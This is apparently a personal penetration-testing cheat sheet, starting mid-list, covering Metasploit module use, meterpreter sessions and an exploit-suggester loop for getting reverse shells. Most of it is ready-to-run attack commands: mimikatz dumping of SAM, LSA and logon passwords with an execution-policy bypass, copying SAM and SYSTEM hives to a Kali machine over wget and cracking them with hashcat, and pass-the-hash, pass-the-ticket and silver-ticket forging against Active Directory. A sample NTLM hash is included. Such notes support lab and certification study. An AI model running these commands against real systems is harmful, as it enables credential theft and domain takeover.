- to use a module: `use <#>` or use `use auxiliary/scanner/smb/smb ms17 010`
- see options that needs to be filled: `options`
- set rhost: `set rhosts 192.168.1.53`
- deploy: `run`
- see exploit target of a module: `show targets`
- check if payload matches your target e.g. x64 or x86 machine: `show payloads`
- Backdoor add user: `windows/manage/add_user`

## Meterpreter (meterpreter >)
- We can background a currently running meterpreter session and return back to msfconsole using: `background`
- To check meterpreter sessions at background: `sessions -i`
- to go back to session #5 in background meterpreter session: `sessions -i 5`+

## Metasploit frame
1. run exploit suggester to enumerate vuls in target: `use post/multi/recon/local_exploit_suggester`
2. for each vulnerabilities suggested, run metasploit payload to obtain Reverse shell: `use exploit/windows/local/ms10_015_kitrap0d`
3. repeat thru the listed of suggested exploits and try until success

## Dump SAM (NTLM) and LSA using mimikatz
1. needs to be admin to run mimikatz
2. `powershell -ep bypass`
3. `import-module .\invoke-mimikatz.ps1`
4. `Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'`

## Crack SAM (NTLM hash) and SYSTEM
1. On Windows, run hfs.exe to transfer SAM and SYSTEM to Kali (drag and drop)
2. On Kali, `wget http://192.168.1.55/sam` and `wget http://192.168.1.55/system`
3. Use samdump2 to decrypt SAM. `samdump2 system sam`
4. Copy and paste the hashes from (3) to notepad: `hashcat -m 1000 -a 3 hashes.txt rockyou.txt`
5. Note: -m specifies the hash type to decrypt e.g. 1000 = NTLM
   
## pass the hash using mimikatz
1. `powershell -ep bypass`
2. import-module .\invoke-mimikatz.ps1`
3. `Invoke-Mimikatz -Command '"sekurlsa::pth /user:stdent5 /domain:pentesting/ntlm:369def79d8372408bf6e93364cc93075 /run:powershell.exe"'`
4. Wait for 
5. Note for PTH, hash is valid only until the user change the password -> use RC4, while pass the ticket is only valid for a few hours.
6. Note: Kerberos is using AES256**

## Pass the ticket 1
1. `.\mimikatz.exe` or `import-module .\invoke-mimikatz.ps1`
2. Export .kirbi file (with latest timestamp) to the working directory folder: `export Kirsekurlsa::tickets /export` or `Invoke-Mimikatz -Command '"Mimikatz::debug" "sekurlsa::tickets /export" "exit"'`
3. Finds the newly exported file int he working directory folder: `dir *.kirbi`
4. Pass the ticket: `mimikatz # kerberos::ptt *[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi*` or `invoke-mimikatz -Command '"Mimikatz::debug "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi" "exit"'
5. To list and show all the cached TGT and TGS tickets that you have: `klist`**

## Silver ticket
- Exploitation mimikatz.exe
```
kerberos::purge
kerberos::list
kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<hostname.domain> /service:HTTP /rc4:<service_account_password_hash> /ptt
```
or
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
kerberos::list
```

## Pass the ticket 2
1. Use Rubeus instead of mimikatz

## Use when trapped
- https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
- https://www.netwrix.com/attack.html
- https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
